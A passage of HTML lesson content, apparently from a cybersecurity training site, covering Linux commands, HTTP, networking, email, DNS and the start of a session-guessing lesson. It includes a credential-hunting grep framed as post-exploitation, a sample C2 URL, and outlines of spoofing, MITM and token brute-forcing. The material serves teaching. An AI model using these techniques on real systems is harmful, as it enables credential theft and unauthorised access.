                <div class="theory-callout danger"><strong>🔒 SUID Bit:</strong> When set (<code>chmod u+s</code>), a program runs with the <strong>owner's privileges</strong> regardless of who executes it. SUID root binaries are prime privilege escalation targets!</div>`,

            'env-variables': `
                <h2>Environment Variables & PATH</h2>
                <p>Environment variables are system-wide name-value pairs that configure the shell and programs.</p>
                <h3>Key Variables</h3>
                <pre class="code-example">$ echo $PATH         # Directories searched for commands
/usr/local/bin:/usr/bin:/bin

$ echo $HOME         # User's home directory
/home/username

$ echo $USER         # Current username
$ echo $SHELL        # Current shell
$ env                # Show all variables

$ export MY_VAR="hello"  # Set a variable
$ unset MY_VAR           # Remove a variable</pre>
                <h3>Hidden Files</h3>
                <ul>
                    <li>Files starting with <code>.</code> (dot) are hidden by default</li>
                    <li><code>ls -a</code> shows hidden files</li>
                    <li>Examples: <code>.bashrc</code>, <code>.ssh/</code>, <code>.bash_history</code></li>
                </ul>`,

            'tab-completion': `
                <h2>Tab Completion & History</h2>
                <p>Master these shortcuts to dramatically speed up your terminal workflow.</p>
                <h3>Productivity Shortcuts</h3>
                <ul>
                    <li><strong>Tab</strong> — Auto-complete commands and filenames</li>
                    <li><strong>Tab Tab</strong> — Show all possible completions</li>
                    <li><strong>Up/Down arrows</strong> — Navigate command history</li>
                    <li><strong>CTRL+R</strong> — Reverse search through history</li>
                    <li><strong>history</strong> — Show all previous commands</li>
                    <li><code>~/.bash_history</code> — File storing command history</li>
                </ul>
                <div class="theory-callout warning"><strong>🔒 Security Note:</strong> <code>.bash_history</code> may contain sensitive commands with passwords. Use <code>export HISTCONTROL=ignorespace</code> to exclude commands starting with a space from history.</div>`,

            'interrupts-jobs': `
                <h2>Interrupts & Job Control</h2>
                <p>Control running processes directly from the keyboard.</p>
                <h3>Key Combinations</h3>
                <ul>
                    <li><strong>CTRL+C</strong> — Send SIGINT (interrupt/kill current process)</li>
                    <li><strong>CTRL+Z</strong> — Send SIGTSTP (suspend/pause process)</li>
                    <li><strong>fg</strong> — Resume suspended process in foreground</li>
                    <li><strong>bg</strong> — Resume suspended process in background</li>
                    <li><strong>CTRL+L</strong> or <code>clear</code> — Clear the screen</li>
                    <li><strong>CTRL+D</strong> — Send EOF (end of input/logout)</li>
                </ul>`,

            'man-pages': `
                <h2>Man Pages & Parameters</h2>
                <p>Every Linux command has a manual page explaining its usage, options, and examples.</p>
                <h3>Using Man Pages</h3>
                <pre class="code-example">$ man ls           # Show manual for ls
$ man -k search    # Search all man pages for keyword
$ apropos network  # Same as man -k</pre>
                <h3>Parameter Conventions</h3>
                <ul>
                    <li><strong>Short flags</strong>: <code>-a</code>, <code>-l</code>, <code>-h</code> (single dash, one letter)</li>
                    <li><strong>Long flags</strong>: <code>--all</code>, <code>--long</code>, <code>--help</code> (double dash, full word)</li>
                    <li><strong>Combining</strong>: <code>ls -la</code> is equivalent to <code>ls -l -a</code></li>
                </ul>`,

            'file-operations': `
                <h2>File Operations: cp, mkdir, mv, rm</h2>
                <p>Essential commands for creating, copying, moving, and deleting files and directories.</p>
                <pre class="code-example"># Copy files and directories
$ cp file.txt backup.txt          # Copy a file
$ cp -r source_dir/ dest_dir/     # Copy directory recursively

# Create directories
$ mkdir new_folder                # Create directory
$ mkdir -p a/b/c/d                # Create nested dirs

# Move/Rename
$ mv old.txt new.txt              # Rename a file
$ mv file.txt /path/to/dir/       # Move a file
$ mv -n source dest               # Don't overwrite existing
$ mv -u source dest               # Only if source is newer

# Delete (BE CAREFUL!)
$ rm file.txt                     # Delete a file
$ rm -r directory/                # Delete directory recursively
$ rm -rf directory/               # Force delete (NO CONFIRMATION!)</pre>
                <div class="theory-callout danger"><strong>⚠️ Warning:</strong> <code>rm -rf /</code> will destroy your entire system! Always double-check rm commands, especially with wildcards.</div>`,

            'file-viewing': `
                <h2>File Viewing: cat, less, head, tail</h2>
                <h3>Commands</h3>
                <pre class="code-example">$ cat file.txt          # Display entire file
$ less file.txt         # Page through file (q to quit)
$ head -n 20 file.txt   # First 20 lines
$ tail -n 20 file.txt   # Last 20 lines
$ tail -f logfile.log   # Follow live log updates</pre>
                <p>Use <code>less</code> for large files — it loads pages on demand instead of reading the entire file into memory.</p>`,

            'search-commands': `
                <h2>Search: find, grep, which, apropos</h2>
                <pre class="code-example"># Find files by name, type, or size
$ find / -name "*.conf"           # Find all .conf files
$ find /home -type d              # Find all directories
$ find / -size +100M              # Files larger than 100MB

# Search file contents
$ grep "error" logfile.txt        # Find lines with "error"
$ grep -i "ERROR" logfile.txt     # Case insensitive
$ grep -r "password" /etc/        # Recursive search
$ grep -n "pattern" file.txt      # Show line numbers

# Locate commands
$ which python                    # Full path to python binary
$ apropos network                 # Search command descriptions</pre>
                <div class="theory-callout info"><strong>💡 Security Use:</strong> <code>grep -r "password" /etc/</code> is a common post-exploitation technique to find hardcoded credentials in configuration files.</div>`,

            'file-analysis': `
                <h2>File Analysis: file, strings, wget</h2>
                <pre class="code-example"># Identify file type by magic bytes (not extension!)
$ file mystery_file
mystery_file: ELF 64-bit LSB executable, x86-64

# Extract printable strings from binary files
$ strings malware.bin | grep "http"
http://evil-command-server.com/callback

# Download files from the web
$ wget https://example.com/file.zip
$ wget -O output.txt https://example.com/data</pre>
                <div class="theory-callout info"><strong>🔐 Security Use:</strong> <code>strings</code> is essential for malware analysis — it reveals URLs, commands, and other readable data embedded in executables without executing them.</div>`,

            'processes': `
                <h2>Processes & Job Management</h2>
                <pre class="code-example"># List all running processes
$ ps aux                   # All processes, detailed
$ ps auxf                  # With process tree

# Interactive process viewer
$ top                      # Real-time process monitor
$ htop                     # Enhanced version (if installed)

# Kill processes
$ kill 1234                # Send SIGTERM to PID 1234
$ kill -9 1234             # Send SIGKILL (force kill)
$ killall firefox          # Kill by name</pre>
                <h3>Process Info</h3>
                <ul>
                    <li><strong>PID</strong> — Process ID (unique identifier)</li>
                    <li><strong>PPID</strong> — Parent Process ID</li>
                    <li><strong>UID</strong> — User running the process</li>
                    <li><strong>%CPU / %MEM</strong> — Resource usage</li>
                </ul>`,

            'pipes-redirects': `
                <h2>Pipes & Redirects</h2>
                <p>Pipes and redirects are the <strong>power tools</strong> of the Linux command line — they let you chain commands and control data flow.</p>
                <pre class="code-example"># Pipes: send output of one command as input to another
$ cat access.log | grep "404" | wc -l
# Count how many 404 errors are in the log

$ ps aux | grep python
# Find running Python processes

# Redirects
$ echo "hello" > file.txt     # Write to file (overwrite)
$ echo "world" >> file.txt    # Append to file
$ command 2> errors.log       # Redirect errors only
$ command > out.txt 2>&1      # Redirect both stdout and stderr
$ command < input.txt         # Use file as input</pre>`,

            'cron-packages': `
                <h2>Scheduled Tasks & Package Management</h2>
                <h3>Important Files</h3>
                <pre class="code-example"># /etc/passwd — User account information
root:x:0:0:root:/root:/bin/bash
username:x:1000:1000:User:/home/username:/bin/bash

# /etc/shadow — Hashed passwords (root-only)</pre>
                <h3>Cron (Scheduled Tasks)</h3>
                <pre class="code-example">$ crontab -e              # Edit your cron jobs
# minute hour day month weekday command
0 2 * * * /backup.sh      # Run at 2:00 AM daily
*/5 * * * * /check.sh     # Every 5 minutes</pre>
                <h3>Package Management</h3>
                <pre class="code-example"># Debian/Ubuntu
$ sudo apt update && sudo apt upgrade
$ sudo apt install package_name
$ dpkg -i package.deb         # Install local .deb

# Red Hat/CentOS
$ sudo yum install package_name
$ rpm -i package.rpm</pre>`,

            'ssh-building': `
                <h2>SSH & Building from Source</h2>
                <h3>SSH (Secure Shell)</h3>
                <pre class="code-example"># Connect with password
$ ssh user@192.168.1.100

# Connect with key file
$ ssh -i ~/.ssh/mykey.pem user@server.com

# Copy files over SSH
$ scp file.txt user@server:/path/
$ scp -r directory/ user@server:/path/

# Generate SSH key pair
$ ssh-keygen -t ed25519</pre>
                <h3>Building from Source</h3>
                <pre class="code-example">$ tar xzf software.tar.gz
$ cd software/
$ ./configure          # Check dependencies, generate Makefile
$ make                 # Compile the source code
$ sudo make install    # Install to system</pre>
                <h3>Shell Customization</h3>
                <ul>
                    <li><strong>zsh</strong> — Alternative shell with better auto-completion</li>
                    <li><strong>oh-my-zsh</strong> — Framework for managing zsh configuration</li>
                    <li><strong>powerlevel10k</strong> — Popular zsh theme with informative prompt</li>
                </ul>`,

            // ============================================================
            // COURSE 4: Web
            // ============================================================
            'search-engines': `
                <h2>How Search Engines Work</h2>
                <p>Search engines use automated programs called <strong>crawlers</strong> (or spiders) to discover and index web pages.</p>
                <h3>The Process</h3>
                <ol>
                    <li><strong>Crawling</strong> — Bots visit web pages and follow all links</li>
                    <li><strong>Indexing</strong> — All words on each page are stored in a massive database</li>
                    <li><strong>Ranking</strong> — Pages are ranked by authority — the more relevant pages link to it, the higher it ranks</li>
                </ol>
                <div class="theory-callout info"><strong>💡 Search Tips:</strong> Google is keyword-based. Don't search as a sentence! Use fewer, more specific keywords for better results. Google strips common words like "I", "the", "we".</div>`,

            'google-dorks': `
                <h2>Google Commands & Dorks</h2>
                <p>Google supports powerful search operators that security professionals use for <strong>reconnaissance</strong>.</p>
                <h3>Search Operators</h3>
                <pre class="code-example">site:example.com          Restrict to a specific domain
filetype:pdf              Find specific file types
"exact phrase"            Force exact phrase match
*                         Wildcard (matches any word)
-keyword                  Exclude a keyword
intitle:"index of"        Find directory listings
inurl:admin               Find admin pages</pre>
                <h3>Google Dorks (OSINT)</h3>
                <div class="theory-callout danger"><strong>⚠️ Google Dorks</strong> are clever searches that find unintended, sensitive content — unsecured cameras, exposed password files, vulnerable software, and unprotected admin panels. They are a key OSINT (Open Source Intelligence) technique used in penetration testing reconnaissance.</div>`,

            'search-troubleshooting': `
                <h2>Troubleshooting with Search</h2>
                <p>A systematic approach to solving technical problems using search engines.</p>
                <h3>The Process</h3>
                <ol>
                    <li><strong>Generic search</strong> — Start broad: "software name crash when opening"</li>
                    <li><strong>Find forums</strong> — Look for others with the same problem</li>
                    <li><strong>Locate logs</strong> — Search: "software name log file location"</li>
                    <li><strong>Search specific errors</strong> — Copy the exact error code/message</li>
                    <li><strong>Apply fix</strong> — Always backup before making changes</li>
                </ol>
                <div class="theory-callout info"><strong>💡 Pro Tip:</strong> Error codes are far more useful than symptoms. Always search for the exact error message in quotes.</div>`,

            'web-servers': `
                <h2>Web Servers</h2>
                <p>Web servers deliver web content to browsers. There are two main types:</p>
                <h3>Generic Web Servers</h3>
                <ul>
                    <li><strong>Apache</strong> and <strong>Nginx</strong> ("engine-ex") serve files from a configured web root folder</li>
                    <li>The web root contains an <code>index.html</code> or <code>index.php</code> file</li>
                    <li>Easy to set up, no programming needed</li>
                </ul>
                <h3>Custom Web Servers</h3>
                <ul>
                    <li><strong>NodeJS</strong>, <strong>Flask</strong>, <strong>Spring</strong> — routes are programmed into code</li>
                    <li>More flexible, dynamic routing, API endpoints</li>
                </ul>
                <h3>Ports</h3>
                <ul>
                    <li><strong>HTTP</strong> — Port 80 (default)</li>
                    <li><strong>HTTPS</strong> — Port 443 (encrypted)</li>
                    <li>Non-standard ports require explicit specification: <code>https://domain:8008</code></li>
                </ul>`,

            'http-protocol': `
                <h2>HTTP Protocol</h2>
                <p>HTTP (HyperText Transfer Protocol) is a request-response protocol for web communication.</p>
                <h3>Request Methods</h3>
                <pre class="code-example">GET     Retrieve a resource (most common)
POST    Send data to the server (forms, uploads)
PUT     Store/update a resource at a path
DELETE  Remove a resource
HEAD    Get metadata only (no body)</pre>
                <h3>Response Status Codes</h3>
                <pre class="code-example">200  OK              ← Request succeeded
301  Moved Permanently ← Resource relocated
302  Found/Redirect    ← Temporary redirect
403  Forbidden         ← Access denied
404  Not Found         ← Resource doesn't exist
500  Internal Server Error ← Server crashed</pre>
                <h3>Headers</h3>
                <p>Both requests and responses contain headers with metadata: User-Agent, Content-Type, Server, Set-Cookie, etc.</p>`,

            'html-basics': `
                <h2>HTML & Web Pages</h2>
                <p>HTML (HyperText Markup Language) is a <strong>markup language</strong> — not a programming language. It describes the structure of web content using tags.</p>
                <pre class="code-example">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Page Title&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Heading&lt;/h1&gt;
    &lt;p&gt;A paragraph of text.&lt;/p&gt;
    &lt;a href="https://example.com"&gt;A link&lt;/a&gt;
    &lt;img src="photo.jpg" alt="A photo"&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
                <div class="theory-callout info"><strong>💡 Key Point:</strong> HTML alone is <strong>static</strong> — it cannot change based on user input. For dynamic content you need JavaScript (client-side) or PHP/Python (server-side).</div>`,

            'javascript-browser': `
                <h2>JavaScript in the Browser</h2>
                <p>JavaScript is a programming language that runs <strong>inside the browser</strong> (client-side). It can modify HTML after the page loads.</p>
                <pre class="code-example">&lt;script&gt;
  document.getElementById('output').textContent = 'Hello!';
  // Modifies the page after loading
&lt;/script&gt;</pre>
                <div class="theory-callout danger"><strong>⚠️ Security Implication:</strong> JavaScript code is visible in the page source. Never use JavaScript alone for password protection or access control — it runs on the client, which the user controls!</div>`,

            'server-side-php': `
                <h2>Server-Side Languages & PHP</h2>
                <p>Server-side code runs on the web server. The user only sees the HTML output — <strong>never the source code</strong>.</p>
                <h3>Client vs Server Side</h3>
                <pre class="code-example">Client Side (JavaScript)     Server Side (PHP)
─────────────────────────    ────────────────────
Runs in browser              Runs on server
User can see & modify it     User cannot see code
Cannot access databases      Can access databases
For interactivity            For data processing</pre>
                <p>PHP powers interactive features: login, registration, database queries, and dynamic page generation. It requires web server support (Apache with mod_php or Nginx with PHP-FPM).</p>`,

            'cookies-storage': `
                <h2>Cookies & Local Storage</h2>
                <h3>Cookies</h3>
                <ul>
                    <li>Small text files created by the web server on the visitor's computer</li>
                    <li>Most common use: <strong>session ID</strong> after login</li>
                    <li>Have expiry dates (session cookies vs persistent cookies)</li>
                    <li>Only the domain that set the cookie can read it back</li>
                    <li><strong>Exception:</strong> Third-party advertising cookies can track users across websites</li>
                </ul>
                <h3>Local Storage</h3>
                <ul>
                    <li>Sites can store up to <strong>5 MB</strong> in browser local storage</li>
                    <li>Data persists until explicitly cleared</li>
                    <li>No expiry dates (unlike cookies)</li>
                    <li>Only accessible via JavaScript</li>
                </ul>
                <div class="theory-callout warning"><strong>🔒 Security:</strong> Cookies with the <code>HttpOnly</code> flag cannot be accessed by JavaScript, protecting session IDs from XSS attacks. <code>Secure</code> flag ensures cookies are only sent over HTTPS.</div>`,

            // ============================================================
            // COURSE 5: Networking
            // ============================================================
            'network-types': `
                <h2>Network Types & Topologies</h2>
                <h3>Network Types</h3>
                <ul>
                    <li><strong>LAN</strong> (Local Area Network) — Small area: office, school, home</li>
                    <li><strong>WAN</strong> (Wide Area Network) — Large geographical area (the internet is a WAN)</li>
                </ul>
                <h3>Topologies</h3>
                <ul>
                    <li><strong>Star</strong> — Each device connects to a central switch. Most common, easy to maintain and troubleshoot</li>
                    <li><strong>Bus</strong> — All devices share one cable with terminators at each end. Only one device can transmit at a time</li>
                    <li><strong>Ring</strong> — Devices connected in a circular chain</li>
                </ul>`,

            'network-hardware': `
                <h2>Network Hardware</h2>
                <ul>
                    <li><strong>Switch</strong> — Directs data to the correct port based on MAC address. Smart — only sends data where it needs to go</li>
                    <li><strong>Hub</strong> — Like a switch but NOT smart — sends data to ALL connected ports. The receiving computer decides if data is for it. Wireless access points are essentially hubs (broadcast over radio)</li>
                    <li><strong>Router</strong> — Connects two networks (typically LAN to internet). Decides which data goes where. Most home routers include a switch</li>
                    <li><strong>NIC</strong> (Network Interface Card) — Hardware enabling network connection. Ethernet NIC for wired, WiFi NIC for wireless. External NICs available via USB</li>
                </ul>
                <div class="theory-callout warning"><strong>🔒 Security Note:</strong> On a hub or WiFi network, all traffic is visible to all connected devices. This enables packet sniffing attacks. Use encryption (HTTPS, WPA3) on shared networks.</div>`,

            'ip-addresses': `
                <h2>IP Addresses</h2>
                <p>IP addresses identify devices on a network — like street addresses for computers.</p>
                <h3>Private vs Public</h3>
                <pre class="code-example">Private IP Ranges (for LANs):
  10.0.0.0    – 10.255.255.255    (/8)
  172.16.0.0  – 172.31.255.255    (/12)
  192.168.0.0 – 192.168.255.255   (/16)

Public IPs: Everything else (internet-facing)</pre>
                <h3>NAT (Network Address Translation)</h3>
                <p>NAT allows multiple devices on a LAN to share one public IP. The router translates between private and public addresses. NAT also acts as an accidental firewall — unsolicited incoming connections are dropped.</p>`,

            'mac-addresses': `
                <h2>MAC Addresses</h2>
                <p>A <strong>MAC (Media Access Control) address</strong> is a hardware address burned into every Network Interface Card at manufacturing.</p>
                <ul>
                    <li>Format: <code>34:13:65:76:09:86</code> (6 pairs of hex digits = 48 bits)</li>
                    <li>Meant to be <strong>globally unique</strong> and permanent</li>
                    <li>Used by switches to direct data on local networks</li>
                    <li>Unlike IPs, MAC addresses identify specific hardware</li>
                </ul>
                <div class="theory-callout info"><strong>💡 Security:</strong> MAC addresses can be spoofed in software (<code>macchanger</code> on Linux). MAC filtering for WiFi security is easily bypassed.</div>`,

            'packets-protocols': `
                <h2>Packets & Protocols</h2>
                <h3>Packets</h3>
                <p>Data is split into small units called <strong>packets</strong> for network transmission. Each packet contains:</p>
                <ul>
                    <li><strong>Headers</strong> — Destination IP, source IP, MAC addresses, protocol info</li>
                    <li><strong>Payload</strong> — The actual data being transmitted</li>
                    <li>Maximum size: typically 1500 bytes (MTU) to 65535 bytes</li>
                </ul>
                <h3>Protocols</h3>
                <p>A <strong>protocol</strong> is a set of rules governing communication — defining data format, error checking, and flow control.</p>`,

            'tcp-vs-udp': `
                <h2>TCP vs UDP</h2>
                <pre class="code-example">Feature          TCP                    UDP
───────────────  ─────────────────────  ──────────────────
Connection       3-way handshake        No handshake
Reliability      Guaranteed delivery    Best-effort only
Ordering         Sequence numbers       No ordering
Speed            Slower (overhead)      Faster
Retransmission   Yes                    No
Use Cases        Web, email, file       Video, VOIP,
                 transfer               gaming, DNS</pre>
                <h3>TCP Three-Way Handshake</h3>
                <pre class="code-example">Client → Server:  SYN       (I want to connect)
Server → Client:  SYN/ACK   (OK, acknowledged)
Client → Server:  ACK       (Connection established)</pre>
                <p><strong>Ports:</strong> Both TCP and UDP have ports 0-65535. TCP port 80 ≠ UDP port 80 — they are separate ranges.</p>`,

            'ipv4-ipv6': `
                <h2>IPv4 vs IPv6</h2>
                <ul>
                    <li><strong>IPv4</strong> — 32 bits (4 bytes): ~4.3 billion addresses. All used up!</li>
                    <li><strong>IPv6</strong> — 128 bits (16 bytes): 3.4×10³⁸ addresses. Format: <code>2001:0db8::ff00:42:8329</code></li>
                </ul>
                <div class="theory-callout info"><strong>💡 Key Difference:</strong> IPv6 eliminates the need for NAT (every device gets a public IP), but loses NAT's accidental firewall benefit. IPv6 requires explicit firewall configuration.</div>`,

            'subnetting': `
                <h2>Subnetting & CIDR</h2>
                <p>A <strong>subnet mask</strong> divides an IP address into a network portion and a host portion.</p>
                <pre class="code-example">Subnet Mask       CIDR   Network Bits  Hosts
────────────────  ─────  ────────────  ─────────
255.0.0.0         /8     8             16,777,214
255.255.0.0       /16    16            65,534
255.255.255.0     /24    24            254
255.255.255.128   /25    25            126

Private Ranges:
  10.0.0.0/8        (Class A)
  172.16.0.0/12     (Class B)
  192.168.0.0/16    (Class C)

Special:
  127.0.0.1         Loopback (localhost)
  0.0.0.0           Default route</pre>
                <p><strong>.0</strong> = network address, <strong>.255</strong> = broadcast address (reserved, not usable for hosts).</p>`,

            'tcp-udp-depth': `
                <h2>TCP & UDP In Depth</h2>
                <h3>TCP Handshake Detail</h3>
                <pre class="code-example">Step 1: Client → SYN (Seq=0)
Step 2: Server → SYN/ACK (Seq=0, Ack=1)
Step 3: Client → ACK (Ack=1)

Sequence numbers track data ordering.
ACK numbers confirm receipt of data.
If a packet is lost, TCP retransmits it.</pre>
                <h3>UDP Simplicity</h3>
                <p>UDP has no handshake, no sequence numbers, no acknowledgements, no retransmission. If a packet is lost, neither side knows. This makes it ideal for real-time applications where a dropped frame is better than pausing to retransmit.</p>`,

            'app-protocols': `
                <h2>Application Protocols & Wireshark</h2>
                <h3>HTTP</h3>
                <pre class="code-example">Request:
GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html

Response:
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html
Content-Length: 1234</pre>
                <h3>FTP (File Transfer Protocol)</h3>
                <p>Used for uploading and downloading files. Uses two connections: command (port 21) and data (port 20).</p>
                <h3>Wireshark</h3>
                <p>Wireshark captures and analyzes network traffic. Use "Follow TCP Stream" to reconstruct full conversations between hosts.</p>`,

            'email-basics': `
                <h2>How Email Works</h2>
                <ol>
                    <li>User composes and clicks Send</li>
                    <li>Email goes to the <strong>outgoing mail server</strong> (SMTP)</li>
                    <li>Server looks up the recipient's domain MX record via DNS</li>
                    <li>Email is transmitted to the recipient's incoming mail server</li>
                    <li>Incoming server saves email to the correct inbox</li>
                    <li>Recipient's client syncs and displays the email (POP3/IMAP)</li>
                </ol>
                <div class="theory-callout warning"><strong>🔒 Security:</strong> Email is unencrypted by default! Modern servers support STARTTLS for in-transit encryption, but emails are still stored in plaintext on servers.</div>`,

            'smtp-protocol': `
                <h2>SMTP Protocol</h2>
                <p>SMTP (Simple Mail Transfer Protocol) is an ancient, text-based protocol for <strong>sending</strong> email.</p>
                <pre class="code-example">MAIL FROM:&lt;sender@example.com&gt;   ← Sender address
RCPT TO:&lt;recipient@example.com&gt;  ← Recipient address
DATA                              ← Start message body
Subject: Hello
From: sender@example.com

Message text here.
.                                 ← Single dot ends message</pre>
                <div class="theory-callout danger"><strong>⚠️ Security Issue:</strong> SMTP does not verify the FROM address! Anyone with SMTP access can send email pretending to be anyone — this is email spoofing.</div>`,

            'pop3-imap': `
                <h2>POP3 vs IMAP vs Exchange</h2>
                <pre class="code-example">Protocol    Server Storage   Multi-Device   Search
──────────  ───────────────  ────────────   ────────
POP3        Downloads &      No (email on   Client
            DELETES          one device)    only
IMAP        Messages STAY    Yes (syncs     Server-
            on server        read/unread)   side
Exchange    Full sync        Yes (calendar  Full
            (Microsoft)      contacts too)  featured</pre>
                <ul>
                    <li><strong>POP3</strong> — Oldest, downloads email and deletes from server. Risk of data loss.</li>
                    <li><strong>IMAP</strong> — Messages stay on server. Syncs across all devices. Server-side search.</li>
                    <li><strong>Exchange</strong> — Microsoft server software. Supports MAPI, IMAP, POP3, EAS. Windows Server only.</li>
                </ul>`,

            'email-spoofing-spf': `
                <h2>Email Spoofing, SPF & DKIM</h2>
                <h3>Email Spoofing</h3>
                <p>Anyone with SMTP access can send email with <strong>any FROM address</strong>. This is the basis of phishing attacks.</p>
                <h3>SPF (Sender Policy Framework)</h3>
                <p>DNS TXT record listing authorized mail server IPs. Receiving server checks if the sending IP is in the list.</p>
                <h3>DKIM (DomainKeys Identified Mail)</h3>
                <p>DNS TXT record with a <strong>public key</strong>. Sending server signs email with a private key. Receiving server validates the signature. Better than SPF because each domain has separate keys.</p>
                <h3>DMARC</h3>
                <p>DKIM + SPF combined → DMARC framework significantly reduces spoofing by defining what to do when checks fail (reject, quarantine, or none).</p>`,

            'dns-fundamentals': `
                <h2>DNS Fundamentals</h2>
                <p>The <strong>Domain Name System (DNS)</strong> translates human-readable domain names into IP addresses.</p>
                <h3>How It Works</h3>
                <ol>
                    <li>You type <code>example.com</code> in your browser</li>
                    <li>Computer queries its configured DNS server</li>
                    <li>DNS server resolves the name to an IP address</li>
                    <li>Browser connects to that IP address</li>
                </ol>
                <h3>DNS Hierarchy</h3>
                <ul>
                    <li><strong>Root Servers</strong> — Know where TLD servers are</li>
                    <li><strong>TLD Servers</strong> — Know where authoritative servers are (.com, .org, .co.uk)</li>
                    <li><strong>Authoritative Nameservers</strong> — Hold the actual domain→IP mappings</li>
                    <li>Results are <strong>cached</strong> at each level for performance</li>
                </ul>`,

            'dns-lookups': `
                <h2>Forward & Reverse DNS Lookups</h2>
                <ul>
                    <li><strong>Forward Lookup</strong> — Domain name → IP address (most common). Example: example.com → 93.184.216.34</li>
                    <li><strong>Reverse Lookup</strong> — IP address → Domain name. Uses <code>in-addr.arpa</code> domain (e.g., 34.216.184.93.in-addr.arpa). Requires PTR record configuration.</li>
                </ul>
                <pre class="code-example">$ nslookup example.com     # Forward lookup
$ nslookup 93.184.216.34   # Reverse lookup
$ dig example.com          # Detailed DNS query</pre>`,

            'dns-queries': `
                <h2>Recursive vs Iterative Queries</h2>
                <ul>
                    <li><strong>Recursive</strong> — You ask one DNS server; it resolves the entire query on your behalf by querying other servers. Returns the final answer. Uses more server resources.</li>
                    <li><strong>Iterative</strong> — You ask a DNS server; if it doesn't know, it tells you which server to ask next. You keep asking until you get the answer. Current internet standard.</li>
                </ul>`,

            'dns-records': `
                <h2>DNS Record Types</h2>
                <pre class="code-example">Type    Purpose                  Example
──────  ───────────────────────  ────────────────────
A       Domain → IPv4            example.com → 93.184.216.34
AAAA    Domain → IPv6            example.com → 2606:2800:...
CNAME   Domain alias             www.example.com → example.com
MX      Mail server              example.com → mail.example.com
NS      Nameserver               example.com → ns1.example.com
PTR     Reverse DNS (IP→domain)  34.216.184.93 → example.com
TXT     Text data                SPF rules, DKIM public keys</pre>
                <div class="theory-callout info"><strong>💡 Security Use:</strong> TXT records store SPF policies (authorized mail server IPs) and DKIM public keys (for email signature verification).</div>`,

            'icmp-ping': `
                <h2>ICMP & Ping</h2>
                <p>ICMP (Internet Control Message Protocol) transmits error messages and operational info between network devices.</p>
                <pre class="code-example">ICMP Types:
Type 8, Code 0  → Echo Request (ping)
Type 0, Code 0  → Echo Response (pong)
Type 11, Code 0 → Time Exceeded (TTL expired)

$ ping 8.8.8.8        # Test connectivity
$ traceroute 8.8.8.8  # Trace the path (uses TTL)</pre>
                <p><strong>TTL (Time To Live)</strong> = number of router hops before a packet is discarded. Prevents infinite loops.</p>`,

            'dhcp': `
                <h2>DHCP</h2>
                <p>DHCP (Dynamic Host Configuration Protocol) automatically configures network settings for devices joining a network.</p>
                <h3>What DHCP Assigns</h3>
                <ul>
                    <li>IP address</li>
                    <li>Subnet mask</li>
                    <li>Default gateway (router)</li>
                    <li>DNS server addresses</li>
                </ul>
                <div class="theory-callout danger"><strong>⚠️ Attack Vector:</strong> Only ONE DHCP server should exist per network. An attacker controlling DHCP can set themselves as the default gateway or DNS server, enabling man-in-the-middle attacks!</div>`,

            'osi-model': `
                <h2>OSI Model</h2>
                <p>The OSI (Open Systems Interconnection) model has 7 layers describing how network communication works.</p>
                <pre class="code-example">Layer   Name           Examples          Mnemonic
──────  ─────────────  ────────────────  ────────
  7     Application    HTTP, FTP, SMTP   All
  6     Presentation   SSL/TLS, JSON     People
  5     Session        Connections       Seem
  4     Transport      TCP, UDP          To
  3     Network        IP, ICMP          Need
  2     Data Link      Ethernet, MAC     Data
  1     Physical       Cables, signals   Processing

Data goes DOWN the layers when sending,
UP the layers when receiving.</pre>
                <div class="theory-callout info"><strong>😄 Layer 8:</strong> The user — often the weakest link in security!</div>`,

            'tcpip-model': `
                <h2>TCP/IP Model & Packet Headers</h2>
                <h3>TCP/IP vs OSI</h3>
                <pre class="code-example">TCP/IP Layer       OSI Equivalent
─────────────────  ──────────────────
4. Application     Layers 5-7
3. Transport       Layer 4 (TCP/UDP)
2. Internet        Layer 3 (IP)
1. Network Access  Layers 1-2</pre>
                <h3>Packet Encapsulation</h3>
                <ol>
                    <li>Application creates data (e.g., <code>GET / HTTP/1.1</code>)</li>
                    <li>Transport layer adds TCP header (source port, dest port, seq numbers)</li>
                    <li>Network layer adds IP header (source IP, dest IP, packet size)</li>
                    <li>Data Link adds Ethernet frame (source MAC, dest MAC)</li>
                    <li>Physical layer converts to electrical signals</li>
                </ol>`,

            'arp-protocol': `
                <h2>ARP Protocol</h2>
                <p>ARP (Address Resolution Protocol) resolves IP addresses to MAC addresses on local networks.</p>
                <h3>How ARP Works</h3>
                <ol>
                    <li>Computer A broadcasts: "Who has IP 192.168.0.10?"</li>
                    <li>Computer B responds: "That's me! My MAC is 34:13:65:76:09:86"</li>
                    <li>Result is cached in the <strong>ARP table</strong></li>
                </ol>
                <pre class="code-example">$ arp -a               # View ARP table
$ ip neigh show        # Modern equivalent</pre>
                <div class="theory-callout danger"><strong>⚠️ ARP Spoofing:</strong> ARP has no authentication. An attacker can send fake ARP replies to redirect traffic through their machine (man-in-the-middle attack).</div>`,

            'dos-attacks': `
                <h2>Denial of Service Attacks</h2>
                <h3>DoS vs DDoS</h3>
                <ul>
                    <li><strong>DoS</strong> — Single source floods a target with traffic or requests</li>
                    <li><strong>DDoS</strong> — Distributed attack using thousands of compromised machines (botnets)</li>
                </ul>
                <h3>Attack Types</h3>
                <ul>
                    <li><strong>Bandwidth Saturation</strong> — Overwhelm the network connection with sheer volume</li>
                    <li><strong>Protocol Layer</strong> — TCP SYN flood fills connection tables</li>
                    <li><strong>Application Layer</strong> — Target expensive endpoints (login, search). Harder to detect because requests look legitimate</li>
                </ul>
                <div class="theory-callout info"><strong>🛡️ Defense:</strong> CDN/DDoS protection services (Cloudflare), rate limiting, connection table tuning, and application-layer filtering.</div>`,

            // ============================================================
            // COURSE 6: Additional Offensive Security Theory
            // ============================================================
            'session-guessing': `
                <h2>Session Guessing</h2>
                <p>Session tokens identify authenticated users. If token generation is <strong>predictable</strong>, attackers can guess valid sessions.</p>
                <h3>Bad Session ID Examples</h3>
                <pre class="code-example">Sequential:  505, 506, 507...
User-based:  user-01829, user-01830...
MD5(seq):    MD5("504") → 059923134c975b...</pre>
                <h3>Attack</h3>
                <p>Write a script that loops through possible session tokens via GET requests, checking each for a valid response.</p>
                <h3>Mitigation</h3>
                <ul>
                    <li>Use <strong>cryptographically random</strong> session tokens (e.g., <code>SecureRandom</code>)</li>
